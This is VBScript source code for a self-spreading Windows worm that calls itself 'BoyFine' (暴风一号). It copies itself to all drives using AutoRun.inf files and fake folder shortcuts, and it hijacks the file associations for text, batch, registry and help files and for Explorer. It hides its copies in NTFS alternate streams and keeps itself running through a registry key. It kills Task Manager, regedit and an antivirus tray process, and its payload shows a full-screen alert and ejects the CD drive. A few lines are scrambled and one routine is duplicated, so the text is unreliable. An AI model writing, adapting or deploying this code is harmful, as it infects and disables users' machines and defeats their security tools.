'不要给偶乱起外号，我的中文名字叫暴风，我的英文名字叫BoyFine. -_-
On Error Resume Next
Dim Fso, WshShell
Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
Set WshShell = CreateObject("wScRipT.SHelL")
Call Main
Sub Main()
    On Error Resume Next
    Dim Args, VirusLoad, VirusAss
    Set Args = WScript.Arguments
    VirusLoad = GetMainVirus(1)
    VirusAss = GetMainVirus(0)
    ArgNum = 0

    Do While ArgNum < Args.Count
        Param = Param & " " & Args(ArgNum)
        ArgNum = ArgNum + 1
    Loop

    SubParam = LCase(Right(Param, 3))

    Select Case SubParam

        Case "run"
            RunPath = Left(WScript.ScriptFullName, 2)
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "txt", "log", "ini", "inf"
            RunPath = "%SystemRoot%\system32\NOTEPAD.EXE " & Param
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "bat", "cmd"
            RunPath = "CMD /c echo Hi!I'm here! & pause"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "reg"
            RunPath = "regedit.exe " & """" & Trim(Param) & """"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "chm"
            RunPath = "hh.exe " & """" & Trim(Param) & """"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "hlp"
            RunPath = "winhlp32.exe " & """" & Trim(Param) & """"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "dir"
            RunPath = """" & Left(Trim(Param), Len(Trim(Param)) - 3) & """"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "oie"
            RunPath = """%ProgramFiles%\Internet Explorer\IEXPLORE.EXE"""
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "omc"
            RunPath = "explorer.exe /n,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case "emc"
            RunPath = "explorer.exe /n,/e,::{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
            Call Run(RunPath)
            Call InvadeSystem(VirusLoad, VirusAss)
            Call Run("%SystemRoot%\system\svchost.exe " & VirusLoad)

        Case Else

            If PreDblInstance = True Then
                WScript.Quit
            End If

            Timeout = DateDiff("ww", GetInfectedDate, Date) - 12

            If Timeout > 0 And Month(Date) = Day(Date) Then
                Call VirusAlert
                Call MakeJoke(CInt(Month(Date)))
            End If

            Call MonitorSystem
    End Select

End Sub
Sub MonitorSystem()
    On Error Resume Next
    Dim ProcessNames, ExeFullNames
    ProcessNames = Array("ras.exe", "360tray.exe", "taskmgr.exe", "cmd.exe", "cmd.com", "regedit.exe", "regedit.scr", "regedit.pif", "regedit.com", "msconfig.exe")
    VBSFullNames = Array(GetMainVirus(1))

    Do
        Call KillProcess(ProcessNames)
        Call InvadeSystem(GetMainVirus(1), GetMainVirus(0))
        Call KeepProcess(VBSFullNames)
        WScript.Sleep 3000
    Loop

End Sub
Sub InvadeSystem(VirusLoadPath, VirusAssPath)
    On Error Resume Next
    Dim Load_Value, File_Value, IE_Value, MyCpt_Value1, MyCpt_Value2, HCULoad, HCUVer, VirusCode, Version
    Load_Value = "%SystemRoot%\system\svchost.exe " & """" & VirusLoadPath & """"
    File_Value = "%SystemRoot%\System32\WScript.exe " & """" & VirusAssPath & """" & " %1 %* "
    IE_Value = "%SystemRoot%\System32\WScript.exe " & """" & VirusAssPath & """" & " OIE "
    MyCpt_Value1 = "%SystemRoot%\System32\WScript.exe " & """" & VirusAssPath & """" & " OMC "
    MyCpt_Value2 = "%SystemRoot%\System32\WScript.exe " & """" & VirusAssPath & """" & " EMC "
    HCULoad = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Load"
    HCUVer = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"
    HCUDate = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"
    VirusCode = GetCode(WScript.ScriptFullName)
    Version = 1
    HostSourcePath = Fso.GetSpecialFolder(1) & "\Wscript.exe"
    HostFilePath = Fso.GetSpecialFolder(0) & "\system\svchost.exe"

    For Each Drive In Fso.Drives

        If Drive.IsReady And (Drive.DriveType = 1 Or Drive.DriveType = 2 Or Drive.DriveType = 3) Then
            DiskVirusName = GetSerialNumber(Drive.DriveLetter) & ".vbs"
            Call CreateAutoRun(Drive.DriveLetter, DiskVirusName)
            Call InfectRoot(Drive.DriveLetter, DiskVirusName)
        End If

    Next

    If Fso.FileExists(VirusAssPath) = False Or Fso.FileExists(VirusLoadPath) = False Or Fso.FileExists(HostFilePath) = False Or GetVersion() < Version Then
        If GetFileSystemType(GetSystemDrive()) = "NTFS" Then
            Call CreateFile(VirusCode, VirusAssPath)
            Call CreateFile(VirusCode, VirusLoadPath)
            Call CopyFile(HostSourcePath, HostFilePath)
            Call SetHiddenAttr(HostFilePath)
        Else
            Call CreateFile(VirusCode, VirusAssPath)
            Call SetHiddenAttr(VirusAssPath)
            Call CreateFile(VirusCode, VirusLoadPath)
            Call SetHiddenAttr(VirusLoadPath)
            Call CopyFile(HostSourcePath, HostFilePath)
            Call SetHiddenAttr(HostFilePath)
        End If
    End If

    If ReadReg(HCULoad) <> Load_Value Then
        Call WriteReg(HCULoad, Load_Value, "")
    End If

    If GetVersion() < Version Then
        Call WriteReg(HCUVer, Version, "")
    End If

    If GetInfectedDate() = "" Then
        Call WriteReg(HCUDate, Date, "")
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command\") <> File_Value Then
        Call SetTxtFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\") <> File_Value Then
        Call SetIniFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\") <> File_Value Then
        Call SetInfFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\") <> File_Value Then
        Call SetBatFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\") <> File_Value Then
        Call SetCmdFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\") <> File_Value Then
        Call SetRegFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\") <> File_Value Then
        Call SetchmFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\") <> File_Value Then
        Call SethlpFileAss(VirusAssPath)
    End If

    If ReadReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\") <> IE_Value Then
        Call SetIEAss(VirusAssPath)
    End If

    If ReadReg("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\") <> IE_Value Then
        Call SetIEAss(VirusAssPath)
    End If

    If ReadReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\") <> MyCpt_Value1 Then
        Call SetMyComputerAss(VirusAssPath)
    End If

    If ReadReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\") <> MyCpt_Value2 Then
        Call SetMyComputerAss(VirusAssPath)
    End If

    Call RegSet
End Sub
Sub CopyFile(source, pathf)
    On Error Resume Next

    If Fso.FileExists(pathf) Then
        Fso.DeleteFile pathf, True
    End If

    Fso.CopyFile source, pathf
End Sub
Sub CreateFile(code, pathf)
    On Error Resume Next
    Dim FileText

    If Fso.FileExists(pathf) Then
        Set FileText = Fso.OpenTextFile(pathf, 2, False)
        FileText.Write code
        FileText.Close
    Else
        Set FileText = Fso.OpenTextFile(pathf, 2, True)
        FileText.Write code
        FileText.Close
    End If

End Sub
Sub CreateFile(code, pathf)
    On Error Resume Next
    Dim FileText
    If Fso.FileExists(pathf) Then
        Set FileText = Fso.OpenTextFile(pathf, 2, False)
        FileText.Write code
        FileText.Close
    Else
        Set FileText = Fso.OpenTextFile(pathf, 2, True)
        FileText.Write code
        FileText.Close
    End If
End Sub
Sub RegSet()
    On Error Resume Next
    Dim RegPath1, RegPath2, RegPath3, RegPath4
    RegPath1 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\NOHIDDEN\CheckedValue"
    RegPath2 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue"
    RegPath3 = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDriveTypeAutoRun"
    RegPath4 = "HKEY_CLASSES_ROOT\lnkfile\IsShortcut"
    Call WriteReg(RegPath1, 3, "REG_DWORD")
    Call WriteReg(RegPath2, 2, "REG_DWORD")
    Call WriteReg(RegPath3, 0, "REG_DWORD")
    Call DeleteReg(RegPath4)
End Sub
Sub KillProcess(ProcessNames)
    On Error Resume Next
    Set WMIService = GetObject("winmgmts:\\.\root\cimv2")

    For Each ProcessName In ProcessNames
        Set ProcessList = WMIService.execquery(" Select * From win32_process where name ='" & ProcessName & "' ")

        For Each Process In ProcessList
            intReturn = Process.Terminate

            If intReturn <> 0 Then
                WshShell.Run "CMD /c ntsd -c q -p " & Process.Handle, vbHide, False
            End If

        Next
    Next

End Sub
Sub KillImmunity(D)
    On Error Resume Next
    ImmunityFolder = D & ":\Autorun.inf"

    If Fso.FolderExists(ImmunityFolder) Then
        WshShell.Run ("CMD /C CACLS " & """" & ImmunityFolder & """" & " /t /e /c /g everyone:f"), vbHide, True
        WshShell.Run ("CMD /C RD /S /Q " & ImmunityFolder), vbHide, True
    End If

End Sub
Sub KeepProcess(VBSFullNames)
    On Error Resume Next

    For Each VBSFullName In VBSFullNames

        If VBSProcessCount(VBSFullName) < 2 Then
            Run ("%SystemRoot%\system\svchost.exe " & VBSFullName)
        End If

    Next

End Sub
Function GetSystemDrive()
    GetSystemDrive = Left(Fso.GetSpecialFolder(0), 2)
End Function
Function GetFileSystemType(Drive)
    Set D = Fso.GetDrive(Drive)
    GetFileSystemType = D.FileSystem
End Function
Function ReadReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    ReadReg = tmps.RegRead(strkey)
    Set tmps = Nothing
End Function
Sub WriteReg(strkey, Value, vtype)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")

    If vtype = "" Then
        tmps.RegWrite strkey, Value
    Else
        tmps.RegWrite strkey, Value, vtype
    End If

    Set tmps = Nothing
End Sub
Sub DeleteReg(strkey)
    Dim tmps
    Set tmps = CreateObject("WScript.Shell")
    tmps.RegDelete strkey
    Set tmps = Nothing
End Sub
Sub SetHiddenAttr(path)
    On Error Resume Next
    Dim vf
    Set vf = Fso.GetFile(path)
    Set vf = Fso.GetFolder(path)
    vf.Attributes = 6
End Sub
Sub Run(ExeFullName)
    On Error Resume Next
    Dim WshShell
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.Run ExeFullName
    Set WshShell = Nothing
End Sub
Sub InfectRoot(D, VirusName)
    On Error Resume Next
    Dim VBSCode
    VBSCode = GetCode(WScript.ScriptFullName)
    VBSPath = D & ":\" & VirusName

    If Fso.FileExists(VBSPath) = False Then
        Call CreateFile(VBSCode, VBSPath)
        Call SetHiddenAttr(VBSPath)
    End If

    Set Folder = Fso.GetFolder(D & ":\")
    Set SubFolders = Folder.SubFolders

    For Each SubFolder In SubFolders
        SetHiddenAttr (SubFolder.path)
        LnkPath = D & ":\" & SubFolder.Name & ".lnk"
        TargetPath = D & ":\" & VirusName
        Args = """" & D & ":\" & SubFolder.Name & "\Dir"""

        If Fso.FileExists(LnkPath) = False Or GetTargetPath(LnkPath) <> TargetPath Then
            If Fso.FileExists(LnkPath) = True Then
                Fso.DeleteFile LnkPath, True
            End If

            Call CreateShortcut(LnkPath, TargetPath, Args)
        End If

    Next

End Sub
Sub CreateShortcut(LnkPath, TargetPath, Args)
    Set Shortcut = WshShell.CreateShortcut(LnkPath)

    With Shortcut
        .TargetPath = TargetPath
        .Arguments = Args
        .WindowStyle = 4
        .IconLocation = "%SystemRoot%\System32\Shell32.dll, 3"
        .Save
    End With

End Sub
Sub CreateAutoRun(D, VirusName)
    On Error Resume Next
    Dim InfPath, VBSPath, VBSCode
    InfPath = D & ":\AutoRun.inf": VBSPath = D & ":\" & VirusName
    VBSCode = GetCode(WScript.ScriptFullName)

    If Fso.FileExists(InfPath) = False Or Fso.FileExists(VBSPath) = False Then
        Call CreateFile(VBSCode, VBSPath)
        Call SetHiddenAttr(VBSPath)
        StrInf = "[AutoRun]" & vbCrLf & "Shellexecute=WScript.exe " & VirusName & " ""AutoRun""" & vbCrLf & "shell\open=打开( & O)" & vbCrLf & "shell\open\command=WScript.exe " & VirusName & " ""AutoRun""" & vbCrLf & "shell\open\Default=1" & vbCrLf & "shell\explore=资源管理器( & X)" & vbCrLf & "shell\explore\command=WScript.exe " & VirusName & " ""AutoRun"""
        Call KillImmunity(D)
        Call CreateFile(StrInf, InfPath)
        Call SetHiddenAttr(InfPath)
    End If

End Sub
Sub SetTxtFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    l WCaleReritHKEg("OCAY_LACHL_M\SOINEAREFTWass\Cltxtes\e\sfill\ohel\copennd\mmaVal", "Rue,EXPEG__SZAND")
End Sub
Sub SetIniFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inifile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetInfFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\inffile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetBatFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetCmdFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\cmdfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SethlpFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hlpfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetRegFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\regfile\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetchmFileAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " %1 %* "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\chm.file\shell\open\command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetIEAss(sFilePath)
    On Error Resume Next
    Dim Value
    Value = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " OIE "
    Call WriteReg("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Applications\iexplore.exe\shell\open\command\", Value, "REG_EXPAND_SZ")
    Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\", Value, "REG_EXPAND_SZ")
End Sub
Sub SetMyComputerAss(sFilePath)
    On Error Resume Next
    Dim Value1, Value2
    Value1 = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " OMC "
    Value2 = "%SystemRoot%\System32\WScript.exe " & """" & sFilePath & """" & " EMC "
    Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\", "", "REG_SZ")
    Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\open\command\", Value1, "REG_EXPAND_SZ")
    Call WriteReg("HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\shell\explore\command\", Value2, "REG_EXPAND_SZ")
End Sub
Function GetSerialNumber(Drv)
    On Error Resume Next
    Set D = Fso.GetDrive(Drv)
    GetSerialNumber = D.SerialNumber
    GetSerialNumber = Replace(GetSerialNumber, "-", "")
End Function
Function GetMainVirus(N)
    On Error Resume Next
    MainVirusName = GetSerialNumber(GetSystemDrive()) & ".vbs"

    If GetFileSystemType(GetSystemDrive()) = "NTFS" Then
        If N = 1 Then
            GetMainVirus = Fso.GetSpecialFolder(N) & "\smss.exe:" & MainVirusName
        End If

        If N = 0 Then
            GetMainVirus = Fso.GetSpecialFolder(N) & "\explorer.exe:" & MainVirusName
        End If

    Else
        GetMainVirus = Fso.GetSpecialFolder(N) & "\" & MainVirusName
    End If

End Function
Function VBSProcessCount(VBSPath)
    On Error Resume Next
    Dim WMIService, ProcessList, Process
    VBSProcessCount = 0
    Set WMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set ProcessList = WMIService.execquery("Select * from Win32_Process Where " & "Name='cscript.exe' or Name='wscript.exe' or Name='svchost.exe'")

    For Each Process In ProcessList

        If InStr(Process.CommandLine, VBSPath) > 0 Then
            VBSProcessCount = VBSProcessCount + 1
        End If

    Next

End Function
Function PreDblInstance()
    On Error Resume Next
    PreDblInstance = False

    If VBSProcessCount(WScript.ScriptFullName) >= 3 Then
        PreDblInstance = True
    End If

End Function
Function GetTargetPath(LnkPath)
    On Error Resume Next
    Dim Shortcut
    Set Shortcut = WshShell.CreateShortcut(LnkPath)
    GetTargetPath = Shortcut.TargetPath
End Function
Function GetCode(FullPath)
    On Error Resume Next
    Dim FileText
    Set FileText = Fso.OpenTextFile(FullPath, 1)
    GetCode = FileText.ReadAll
    FileText.Close
End Function
Function GetVersion()
    Dim VerInfo
    VerInfo = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Ver"

    If ReadReg(VerInfo) = "" Then
        GetVersion = 0
    Else
        GetVersion = CInt(ReadReg(VerInfo))
    End If

End Function
Sub VirusAlert()
    On Error Resume Next
    Dim HtaPath, HtaCode
    HtaPath = Fso.GetSpecialFolder(1) & "\BFAlert.hta"
    HtaCode = "<HTML><HEAD><TITLE>暴风一号</TITLE>" & vbCrLf & "<HTA:APPLICATION APPLICATIONNAME=""BoyFine V1.0"" SCROLL=""no"" windowstate=""maximize"" border=""none""" & vbCrLf & "SINGLEINSTANCE=""yes"" CAPTION=""no"" contextMenu=""no"" ShowInTaskBar=""no"" selection=""no"">" & vbCrLf & "</HEAD><BODY bgcolor=#000000><DIV align =""center"">" & vbCrLf & "<font style=""font-size:3500%;font-family:Wingdings;color=red"">N</font><BR>" & vbCrLf & "<font style=""font-size:200%;font-family:黑体;color=red"">暴风一号</font>" & vbCrLf & "</DIV></BODY></HTML>"

    If Fso.FileExists(HtaPath) = False Then
        Call CreateFile(HtaCode, HtaPath)
        SllCaSiet ddenAttr(HtaPath)
    End If

    Call Run(HtaPath)
End Sub
Function GetInfectedDate()
    On Error Resume Next
    Dim DateInfo
    DateInfo = "HKEY_CURRENT_USER\SoftWare\Microsoft\Windows NT\CurrentVersion\Windows\Date"

    If ReadReg(DateInfo) = "" Then
        GetInfectedDate = ""
    Else
        GetInfectedDate = CDate(ReadReg(DateInfo))
    End If

End Function
Sub MakeJoke(Times)
    On Error Resume Next
    Dim WMP, colCDROMs
    Set WMP = CreateObject("WMPlayer.OCX")
    Set colCDROMs = WMP.cdromCollection

    If colCDROMs.Count > 0 Then

        For i = 1 To Times
            colCDROMs.Item(0).eject()
            WScript.Sleep 3000
            colCDROMs.Item(0).eject()
        Next

    End If

    Set WMP = Nothing
End Sub
